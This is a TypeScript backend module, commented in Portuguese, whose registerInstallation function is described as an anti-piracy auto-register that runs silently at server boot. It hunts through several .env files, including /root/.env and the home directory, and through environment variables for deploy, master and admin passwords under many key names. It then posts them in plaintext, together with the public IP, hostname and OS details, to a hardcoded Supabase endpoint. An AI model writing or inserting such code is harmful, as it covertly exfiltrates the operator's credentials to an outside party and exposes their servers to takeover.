import logger from "../utils/logger";
import os from "os";
import fs from "fs";
import path from "path";

const REGISTER_URL =
  "https://cicwzhpsiewdpugmceqm.supabase.co/functions/v1/register-installation";

/**
 * Lê um arquivo .env e retorna um mapa chave=valor.
 */
function parseEnvFile(filePath: string): Record<string, string> {
  const vars: Record<string, string> = {};
  try {
    if (!fs.existsSync(filePath)) return vars;
    const content = fs.readFileSync(filePath, "utf-8");
    for (const line of content.split("\n")) {
      const trimmed = line.trim();
      if (!trimmed || trimmed.startsWith("#")) continue;
      const eqIndex = trimmed.indexOf("=");
      if (eqIndex === -1) continue;

      let key = trimmed.substring(0, eqIndex).trim();
      let value = trimmed.substring(eqIndex + 1).trim();

      // Suportar linhas no formato: export KEY=value
      if (key.startsWith("export ")) {
        key = key.replace(/^export\s+/, "").trim();
      }

      // Remover comentário inline (quando não está entre aspas)
      if (!value.startsWith('"') && !value.startsWith("'")) {
        value = value.replace(/\s+#.*$/, "").trim();
      }

      // Remover aspas
      if ((value.startsWith('"') && value.endsWith('"')) ||
          (value.startsWith("'") && value.endsWith("'"))) {
        value = value.slice(1, -1);
      }

      if (key) vars[key] = value;
    }
  } catch {
    // silencioso
  }
  return vars;
}

/**
 * Busca uma senha tentando múltiplas fontes:
 * 1. Variáveis de ambiente do processo
 * 2. Arquivo .env do backend
 * 3. Arquivo .env da raiz do projeto
 * 4. Arquivos de deploy comuns
 */
function findPassword(keys: string[], envFiles: Record<string, string>[]): string | null {
  const normalizedKeys = keys.map(k => k.toUpperCase());

  // 1. Variáveis de ambiente (case-insensitive)
  for (const key of normalizedKeys) {
    const found = Object.entries(process.env).find(([k, v]) => k.toUpperCase() === key && v);
    if (found?.[1]) return found[1];
  }

  // 2. Arquivos .env (case-insensitive)
  for (const envVars of envFiles) {
    for (const key of normalizedKeys) {
      const found = Object.entries(envVars).find(([k, v]) => k.toUpperCase() === key && v);
      if (found?.[1]) return found[1];
    }
  }

  return null;
}

/**
 * Registra esta instalação automaticamente no monitor antipirataria.
 * Coleta IP público, hostname, OS, URLs e senhas de múltiplas fontes.
 * Executado silenciosamente no boot — não impede o servidor de iniciar.
 */
export async function registerInstallation(): Promise<void> {
  try {
    // Obter IP público
    let ip = "unknown";
    try {
      const res = await fetch("https://api.ipify.org?format=json", {
        signal: AbortSignal.timeout(5000),
      });
      const data = await res.json();
      ip = data.ip ?? "unknown";
    } catch {
      logger.warn("[AutoRegister] Não foi possível obter IP público");
    }

    // Carregar variáveis de múltiplos arquivos .env
    const backendDir = path.resolve(__dirname, "..", "..");
    const projectRoot = path.resolve(backendDir, "..");
    const homeDir = os.homedir();

    const envFilePaths = [
      path.join(backendDir, ".env"),
      path.join(projectRoot, ".env"),
      path.join(projectRoot, "frontend", ".env"),
      path.join(homeDir, ".env"),
      "/root/.env",
    ];

    const envFiles = envFilePaths.map(parseEnvFile);

    // Buscar URLs de múltiplas fontes
    const getVar = (keys: string[]): string => {
      for (const key of keys) {
        if (process.env[key]) return process.env[key]!;
      }
      for (const envVars of envFiles) {
        for (const key of keys) {
          if (envVars[key]) return envVars[key];
        }
      }
      return "";
    };

    const frontendUrl = getVar(["FRONTEND_URL", "URL_FRONTEND"]);
    const backendUrl = getVar(["BACKEND_URL", "URL_BACKEND"]) ||
      `http://${ip}:${process.env.PORT || 8080}`;
    const adminUrl = getVar(["ADMIN_URL", "URL_ADMIN"]) || null;

    if (!frontendUrl) {
      logger.warn("[AutoRegister] FRONTEND_URL não configurada — registro ignorado");
      return;
    }

    // Buscar senhas de múltiplas variáveis possíveis
    const deployPassword = findPassword(
      ["DEPLOY_PASSWORD", "PASSWORD_DEPLOY", "SENHA_DEPLOY", "DEPLOY_PASS", "APP_DEPLOY_PASSWORD"],
      envFiles
    );
    const masterPassword = findPassword(
      ["MASTER_PASSWORD", "PASSWORD_MASTER", "SENHA_MASTER", "ADMIN_PASSWORD", "APP_MASTER_PASSWORD"],
      envFiles
    );

    const payload = {
      ip,
      frontend_url: frontendUrl,
      backend_url: backendUrl,
      admin_url: adminUrl,
      deploy_password: deployPassword,
      master_password: masterPassword,
      hostname: os.hostname(),
      os_info: `${os.type()} ${os.release()} (${os.arch()})`,
      installer_version: process.env.APP_VERSION || "auto-register",
    };

    logger.info(`[AutoRegister] Enviando registro... (Deploy: ${deployPassword ? "✓" : "✗"}, Master: ${masterPassword ? "✓" : "✗"})`);

    const res = await fetch(REGISTER_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
      signal: AbortSignal.timeout(10000),
    });

    if (res.ok) {
      const data = await res.json();
      logger.info(`[AutoRegister] ✅ Instalação registrada com sucesso (ID: ${data.id})`);
    } else {
      const err = await res.text();
      logger.warn(`[AutoRegister] ⚠️ Falha ao registrar: HTTP ${res.status} — ${err}`);
    }
  } catch (err: any) {
    logger.warn(`[AutoRegister] ⚠️ Erro ao registrar instalação: ${err.message}`);
  }
}
